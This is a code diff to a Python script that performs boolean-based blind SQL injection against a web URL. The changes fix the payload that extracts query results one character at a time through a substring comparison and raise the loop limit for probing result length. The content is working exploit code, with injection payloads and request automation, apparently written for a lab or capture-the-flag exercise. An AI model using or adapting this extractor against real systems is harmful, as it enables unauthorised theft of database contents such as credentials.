@@ -28,7 +28,7 @@ def format_length_query(inner_query, length):
 
 
 def format_char_query(inner_query, index, char):
-    return f"xyz' or (select length(({inner_query}), {index}, 1)=chr({char}))-- "
+    return f"xyz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "
 
 
 def is_true(resp):
@@ -47,9 +47,9 @@ def format_request(url, outer_query):
 
 
 def determine_response_length(inner_query, url, no_proxy=False):
-    log.info("Determining response length for query.")
+    log.info("Determining response length.")
     sess = requests.Session()
-    for i in range(1, 5):
+    for i in range(1, MAX_LENGTH):
         outer_query = format_length_query(inner_query, i)
         prepped = format_request(url, outer_query)
         if no_proxy:
